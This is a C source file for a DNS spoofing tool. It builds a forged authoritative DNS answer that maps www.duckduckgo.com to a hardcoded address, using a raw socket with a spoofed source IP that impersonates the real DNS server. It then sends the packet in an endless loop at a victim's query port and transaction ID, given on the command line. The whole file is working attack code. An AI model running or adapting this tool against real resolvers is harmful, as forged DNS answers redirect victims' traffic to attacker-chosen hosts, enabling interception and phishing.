#include <limits.h>
#include <resolv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/nameser.h>

//char hostname[] = "www.google.com";
char hostname[] = "www.duckduckgo.com";
unsigned char resolved_ip[] = {142, 250, 72, 46}; /* IP for google.com */

#define DATAGRAM_SIZE 4096

/* Arguments for the capture handler */
struct pkt_info {
  char datagram[DATAGRAM_SIZE];
  size_t msg_len;
  int sockfd;
  char src_ip[NS_IN6ADDRSZ];
  char dst_ip[NS_IN6ADDRSZ];
  int dst_port;
  unsigned short txn_id;
  struct sockaddr_in sin;
};

unsigned short ip_checksum(unsigned short *ptr, int nbytes)
{
  long sum;
  unsigned short oddbyte;
  short answer;

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1)
  {
    oddbyte = 0;
    *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  answer = (short)~sum;

  return answer;
}

static void prepare_poison_pkt(struct pkt_info *pinfo)
{
  struct iphdr *ip_hdr;
  struct udphdr *udp_hdr;
  HEADER *dns_hdr;
  unsigned char *p_dns_payload;
  unsigned char *p_current;
  int one = 1;
  const int *val = &one;
  int dns_payload_size;
  int name_len;
  unsigned char *dns_ptrs[2];

  /* Create a raw socket */
  if ((pinfo->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("socket() error");
    exit(EXIT_FAILURE);
  }

  /* Set IP_HDRINCL socket option */
  if (setsockopt(pinfo->sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    perror("setsockopt() error");
    close(pinfo->sockfd);
    exit(EXIT_FAILURE);
  }

  /* Zero-out the entire packet buffer */
  memset(pinfo->datagram, 0, DATAGRAM_SIZE);

  /* Construct the Packet (IP -> UDP -> DNS) */
  ip_hdr = (struct iphdr *)pinfo->datagram;
  udp_hdr = (struct udphdr *)(pinfo->datagram + sizeof(struct iphdr));
  dns_hdr = (HEADER *)(pinfo->datagram + sizeof(struct iphdr)
            + sizeof(struct udphdr));
  p_dns_payload = (unsigned char *)dns_hdr;

  /* First, the DNS header */
  dns_hdr->id      = htons(pinfo->txn_id);
  dns_hdr->qr      = 1;  /* Response */
  dns_hdr->opcode  = ns_o_query;
  dns_hdr->aa      = 1;  /* Authoritative Answer */
  dns_hdr->tc      = 0;
  dns_hdr->rd      = 0;
  dns_hdr->ra      = 0;
  dns_hdr->rcode   = ns_r_noerror;
  dns_hdr->qdcount = htons(1);
  dns_hdr->ancount = htons(1);
  dns_hdr->nscount = 0;
  dns_hdr->arcount = 0;

  /* DNS question section */
  p_current = p_dns_payload + sizeof(HEADER);
  name_len = dn_comp(hostname, p_current,
                      DATAGRAM_SIZE - (p_current - p_dns_payload), NULL, NULL);
  p_current += name_len;
  ns_put16(ns_t_a, p_current);
  p_current += NS_INT16SZ;
  ns_put16(ns_c_in, p_current);
  p_current += NS_INT16SZ;

  /* DNS answer section */
  // XXX: GC
  //name_len = dn_comp(hostname, p_current,
  //                    DATAGRAM_SIZE - (p_current - p_dns_payload),
  //                    &p_dns_payload, &p_dns_payload + sizeof(HEADER));
  dns_ptrs[0] = p_dns_payload;
  dns_ptrs[1] = NULL;
  name_len = dn_comp(hostname, p_current,
                      DATAGRAM_SIZE - (p_current - p_dns_payload),
                      dns_ptrs, dns_ptrs + 1);
  p_current += name_len;
  ns_put16(ns_t_a, p_current);
  p_current += NS_INT16SZ;
  ns_put16(ns_c_in, p_current);
  p_current += NS_INT16SZ;
  ns_put32(300, p_current);
  p_current += NS_INT32SZ;
  ns_put16(NS_INADDRSZ, p_current);
  p_current += NS_INT16SZ;
  memcpy(p_current, resolved_ip, NS_INADDRSZ);
  p_current += NS_INADDRSZ;

  /* Calculate sizes */
  dns_payload_size = p_current - p_dns_payload;

  /* Construct the UDP header */
  udp_hdr->source = htons(NS_DEFAULTPORT);
  udp_hdr->dest   = htons(pinfo->dst_port);
  udp_hdr->len    = htons(sizeof(struct udphdr) + dns_payload_size);
  udp_hdr->check  = 0;

  /* Construct the IP Header */
  ip_hdr->ihl      = 5;
  ip_hdr->version  = 4;
  ip_hdr->tos      = 0;
  ip_hdr->tot_len  = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_size;
  ip_hdr->id       = htonl(rand() % USHRT_MAX);
  ip_hdr->frag_off = 0;
  ip_hdr->ttl      = 64;
  ip_hdr->protocol = IPPROTO_UDP;
  ip_hdr->check    = 0;
  ip_hdr->saddr    = inet_addr(pinfo->src_ip);
  ip_hdr->daddr    = inet_addr(pinfo->dst_ip);
  ip_hdr->check    = ip_checksum((unsigned short *)pinfo->datagram, ip_hdr->tot_len);

  /* Fill in ip_hdr total length */
  pinfo->msg_len = ip_hdr->tot_len;

  /* Fill in sockaddr_in fields */
  pinfo->sin.sin_family = AF_INET;
  pinfo->sin.sin_port = htons(pinfo->dst_port);
  pinfo->sin.sin_addr.s_addr = inet_addr(pinfo->dst_ip);
}

static void poison(struct pkt_info *pinfo)
{
  /* Verbose */
  //printf("[o] Sending poison packet...\n");

  /* Send the packet */
  if (sendto(pinfo->sockfd, pinfo->datagram, pinfo->msg_len, /* flags */0,
              (struct sockaddr *)&(pinfo->sin), sizeof(pinfo->sin)) < 0) {
    perror("sendto() error");
  } else {
    /* Verbose */
    //printf("[+] Successfully sent DNS response packet!\n");
    //printf("  ... Transaction ID: %u\n", pinfo->txn_id);
    //printf("  ... Spoofed Source: %s:53\n", pinfo->src_ip);
    //printf("  ... Destination:    %s:%d\n", pinfo->dst_ip, pinfo->dst_port);
  }

  /* Verbose */
  //printf("[+] Sent poison packet!\n");
}

void usage(const char *prog)
{
  printf("Usage: %s <dst_ip> <src_ip> <dst_port> <txn_id>\n\n", prog);
  printf("  <dest_ip>      - IP of the original querier.\n");
  printf("  <source_ip>    - IP of the DNS server to impersonate.\n");
  printf("  <dest_port>    - Source port of the original query.\n");
  printf("  <txn_id>       - Transaction ID of the original query.\n\n");
}

int main(int argc, char *argv[])
{
  struct pkt_info pinfo;

  /* Check and parse command-line arguments */
  if (argc != 5) {
    usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  /* Copy arguments into variables */
  strncpy(pinfo.dst_ip, argv[1], sizeof(pinfo.dst_ip) - 1);
  pinfo.dst_ip[sizeof(pinfo.dst_ip) - 1] = '\0'; /* Ensure null-termination */

  strncpy(pinfo.src_ip, argv[2], sizeof(pinfo.src_ip) - 1);
  pinfo.src_ip[sizeof(pinfo.src_ip) - 1] = '\0'; /* Ensure null-termination */

  pinfo.dst_port = atoi(argv[3]);
  pinfo.txn_id = (unsigned short)atoi(argv[4]);

  /* Prepare the poison packet now for faster delivery */
  printf("[o] Preparing poison packet...\n");
  prepare_poison_pkt(&pinfo);
  printf("[+] Poison packet prepared!\n");

  /* Spray poison packets */
  printf("[+] Spraying poison packet!\n   ");
  while (1) {
    poison(&pinfo);
    printf(".");
    usleep(500);
  }

  /* Cleanup */
  close(pinfo.sockfd);
  return EXIT_SUCCESS;
}
